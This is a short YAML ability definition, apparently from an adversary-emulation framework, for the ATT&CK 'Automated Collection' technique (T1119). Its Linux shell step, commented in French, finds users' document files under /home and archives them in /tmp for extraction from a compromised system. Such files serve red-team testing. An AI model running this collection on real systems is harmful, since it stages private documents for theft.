- description: 'Search for and extract files containing sensitive information on a compromised system.'
  id: e750a51d6ede95af4152a82ef5c41fbc
  name: INF808 - Collection of Sensitive Files
  platforms:
    linux:
      sh:
        command: |
                  # Recherche de fichiers sensibles sur le système
                  echo "[*] Recherche de fichiers sensibles sur le système"
                  find /home -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.txt" \) > /tmp/sensitive_files.txt

                  # Compression des fichiers collectés
                  echo "[*] Compression des fichiers sensibles collectés"
                  tar -czvf /tmp/sensitive_files.tar.gz -T /tmp/sensitive_files.txt
  tactic: collection
  technique:
    attack_id: T1119
    name: 'Automated Collection'